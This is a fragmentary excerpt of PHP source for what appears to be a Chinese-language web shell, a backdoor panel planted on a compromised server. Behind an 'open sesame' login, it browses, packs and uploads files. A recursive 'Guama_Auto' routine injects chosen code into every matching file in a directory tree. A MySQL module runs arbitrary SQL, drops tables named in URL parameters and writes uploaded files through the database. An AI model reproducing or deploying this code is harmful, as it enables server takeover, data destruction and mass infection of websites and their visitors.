...
function Root_CSS()
{
	...
	<style type="text/css">
		*{padding:0; margin:0;}
		...
		a:hover{background:#BBB;}
		table{color:#000;font-family:"Verdana", "Tahoma", "宋体",sans-serif;font-size:13px;border:1px solid #999;}
		td{background:#F9F6F4;}
		.toptd{background:threedface; width:310px; border-color:#FFF #999 #999 #FFF; border-style:solid;border-width:1px;}
		.msgbox{background:#FFFFE0;color:#F00;height:25px;font-size:12px;border:1px solid #999;text-align:center;padding:3px;clear:both;}
		.actall{background:#F9F6F4;font-size:14px;border:1px solid #999;padding:2px;margin-top:3px;margin-bottom:3px;clear:both;}
	</style>
EOD;
return false;
}
	...
	function packdir($array)
	{
		if (@function_exists('gzcompress')) {
			for ($i=0; $i < count($array); $i++) { 
				...
				$fp=@fopen($array[$i], 'r');
				$filecode=@fread($fp, @filesize($array[$i]));
				@fclose($fp);
				$this -> filezip($filecode,basename($array[$i]));
			}
			@closedir($zhizhen);
		...
		if (count($_FILES["soup"])>=1) {
			...
			foreach ($_FILES["soup"]["error"] as $key => $error) {
				if ($error==UPLOAD_ERR_OK) {
					...
					if (!empty($_POST["reup"][$i])) {
						$soupname=$_POST["reup"][$i];
					}else{
						$soupname=$_FILES["soup"]["name"][$key];
					}
...
function Guama_Auto($gp,$gt,$gl,$gc,$gm,$gf,$gi,$gk,$gd,$gb)
{
	...
	while(false !== ($Filename = @readdir($h_d))){
		...
		if(is_dir($Filepath) && $gb){
			Guama_Auto($Filepath,$gt,$gl,$gc,$gm,$gf,$gi,$gk,$gd,$gb);
		}
		if(eregi($gt,$Filename)){
			$fc = File_Read($Filepath);
			if(($gk != '') && (stristr($fc,chop($gk)))){
				continue;
			}
			if(($gf != '') && ($gm != 0)){
				$gcm = Guama_Make($gf,$gm,$gc);
			}else{
				$gcm = $gc;
			}
			if($gd){
...
function Mysql_m()
{
	...
	if(isset($_POST['mhost']) && isset($_POST['muser'])){
		...
		$mdata = $_POST['mdata']; 
		$mport = $_POST['mport']; 
		$mpath = File_Str($_POST['mpath']); $sqlcmd = $_POST['sqlcmd'];
			...
			if(@mysql_query($query,$conn)){
				if($tmpcode = File_Read($_FILES['upfile']['tmp_name'])){
					...
					if(File_Up($_FILES['upfile']['tmp_name'],$tmp)){
						$filecode = bin2hex(File_Read($tmp));@unlink($tmp);
					}
				}
...
END;
		...
		if(isset($_GET['db'])){
			...
			if(!empty($_POST['nsql'])){
				$BOOL = true; $MSG_BOX = mysql_query($_POST['nsql'],$conn) ? '执行成功' : '执行失败 '.mysql_error();
			}
			...
			if(isset($_GET['drop'])){
				$query = 'Drop TABLE IF EXISTS '.$_GET['drop'].';';$MSG_BOX = mysql_query($query,$conn) ? '删除成功' : '删除失败 '.mysql_error();
			}
			if(isset($_GET['table'])){
				$action .= '&table='.$_GET['table'];if(isset($_GET['edit'])) $action .= '&edit='.$_GET['edit'];
			}
		...
		die('连接MYSQL失败,请重新登陆.<meta http-equiv="refresh" content="0;URL=?s=o">');
	}
	if(!$BOOL){
...
<html>
	<body style="background:#AAAAAA;">
		...
		<div style="width:350px;height:80px;clear:both;"><input type="submit" value="芝麻开门" style="width:80px;"></div>
		</div>
		</form>
		</center>
	</body>
